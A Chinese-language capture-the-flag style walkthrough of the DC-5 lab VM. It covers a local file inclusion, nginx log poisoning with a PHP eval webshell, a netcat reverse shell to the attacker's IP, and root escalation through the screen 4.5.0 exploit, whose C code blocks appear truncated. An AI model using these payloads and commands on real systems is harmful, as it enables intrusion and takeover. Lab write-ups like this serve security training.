## **01 项目安装**

先把DC-5的靶机安装到本地

下载地址是：https://www.five86.com/dc-5.html

![](../Images/db6b85367aff770662b64305d70067d6.png)

进入页面点击`here` 进行下载

下载好之后，导入咱们的虚拟机

![](../Images/3de675820b970c8bafef24a41e8a5a2f.png)

看到这个页面，表示我们靶机安装成功

  

## **02 信息收集**

首先我们进行信息收集，获取靶机的ip和相关端口

```
#获取ip地址
netdiscover \-r  192.168.1.0/24
```

![](../Images/43f58f778a8eb5dac1972c9781b9d1c4.png)

知道了ip，看下靶机开放了哪些端口

```
#获取端口
nmap 192.168.1.119
```

![](../Images/93116a0c59003f95cde2009e6715d932.png)

可以看到靶机开启了80端口，页面访问一下

![](../Images/f7b82d98a5d0ef9140e6bcfa4ce4fbfb.png)

访问成功

  

## **03 文件包含**

在页面中多浏览一下，发现Contact模块下可以输入内容，于是尝试多输入几次之后，发现了有意思的地方

![](../Images/f365c05f651809abd779445d53230a36.png)

![](../Images/3a3ce2384dc71b012f1b978308ccbd89.png)

![](../Images/d083f45dfbc8bdd5c3bdd9a430c7626b.png)

可以看到相同的页面，只是局部发生了改变，说明这里使用了文件包含

首先进行目录扫描，看是否能够找到这个包含的文件

执行

```
python dirsearch.py \-u http://192.168.1.119/solutions.php \-e\*
```

![](../Images/0dc8739513a18fd7a4a7e8a5de17c7e0.png)

可以看到这个脚本是`footer.php`

  

## **04 文件爆破**

既然知道了这个脚本，现在需要知道thankyou.php是如何把footer.php包含的

我们需要用bp进行爆破一下

![](../Images/80bae63c7db957a6bc138d38b2431ac3.png)

需要将参数名爆出来

爆出啦参数名为 `file`

所以完整的地址为

> http://192.168.1.119/thankyou.php?file=footer.php

  

## **05 漏洞利用**

直接将footer.php 改为/etc/passwd

> http://192.168.1.119/thankyou.php?file=/etc/passwd

![](../Images/e9cda1e42898252a1c3a6203f80481e2.png)

可以看到直接把账户名读了出来

既然可以读取密码文件，那也可以读取日志文件，方便我们读取木马文件

说到这里就是考验我们密码字典强大的时候，我们需要把日志文件爆破出来

![](../Images/46286a9141dac2b8ea83fa510420b609.png)

![](../Images/8787a975b04f90a8ac725725d68c3576.png)

可以看到直接把nginx的日志爆了出来

![](../Images/c81df2684ef9acdc89c99e8236606295.png)

接下来就是把木马写入日志中，然后用蚁剑直接进行连接

首先尝试用`phpinfo()`是否可以读取成功

![](../Images/c81df2684ef9acdc89c99e8236606295.png)

访问

> http://192.168.1.119/thankyou.php?file=/var/log/nginx/access.log

tip：要是发现没弹出phpinfo的信息，建议重装靶机，不要觉得是操作上的问题，真的是靶机问题，（这个地方卡我很久）

![](../Images/ee8a6e4c0209b8ea72f93910aaad3416.png)

看到信息弹出，开始写入木马

> <?php @eval($\_POST\[777\]) ; ?>

![](../Images/d2d947b061130ed2630888a8db116f13.png)

然后使用蚁剑进行连接

![](../Images/e09d7abef8ea2becbaa24ce0d5a5bed5.png)

链接成功

接下来反弹shell

kali执行

```
nc \-lvvp 888
```

靶机执行

```
nc \-e /bin/sh 192.168.1.116 888
```

![](../Images/2a532a6f93eb84750eadd49c0bc3b0e8.png)

  

执行

```
#获取完全交互的shell
python \-c  'import pty;pty.spawn ( "/bin/bash")'
```

![](../Images/a97d9e3cdc80c7b972e77d1efded200c.png)

  

## **06 提权**

```
#通过find提权，查看用root权限运行的命令
find / \-perm \-4000 2\>/dev/null
```

![](../Images/5e1c28ab8a96544b54c5a47c083b7c96.png)

可以看到/bin/screen-4.5.0

在kali中执行

```
searchsploit screen 4.5.0
```

![](../Images/3c728941af2cad580c6329fdadb88f60.png)

可以看到有两个漏洞利用，这里我们使用`linux/local/41154.sh`脚本

进入目录看下脚本

![](../Images/9aa5e4bb0e3b32f29b30c98d2a3556ac.png)

  

这个脚本主要由三部分组成，原本是直接执行脚本，可惜这个脚本有问题，所以需要创建2个文件，把每个代码块单独拿出来执行

才可以

1.  创建第一个文件，并复制一下代码块
    

> vi libhax.c

```


#include <stdio.h>
```

  

2.  创建第二个文件，复制第二个代码块
    

> vi rootshell.c

```


#include <stdio.h>
```

![](../Images/355ea3b881a048a51ba40bf187b978d1.png)

  

3.  编译文件
    

> gcc -fPIC -shared -ldl -o libhax.so libhax.c
> 
> gcc -o rootshell rootshell.c

![](../Images/3db43b8a3f5782f4781da2fbd9ac3c1a.png)

![](../Images/93dc0c431ce5ce3a7fc73867cfd4ec4d.png)

可以看到本地生成了两个文件

![](../Images/6a514752e07eda1ddc03e47ef140e557.png)

将这两个文件通过http上传到靶机当中

在kali中执行

```
python -m SimpleHTTPServer 8000
```

![](../Images/fb27b366031a3208aaf5e78353e4a27a.png)

在蚁剑中通过wget下载下来

> http://192.168.1.116:8000/libhax.so

![](../Images/c09126d4cbf8ddf96a70807850816516.png)

  

> http://192.168.1.116:8000/rootshell

![](../Images/c644d0ff4ca8dbbc42d119bcfce1f463.png)

可以看到靶机有两个文件

![](../Images/91f987be8f3975f0b424b7bc2e28e03f.png)

  

执行之前脚本的第三个代码块，依次执行下面每条语句

```


cd /etc
```

![](../Images/59fa3830434c17bb10426b6544e938fa.png)

发现提权成功

![](../Images/59fa3830434c17bb10426b6544e938fa.png)

最终拿到flag
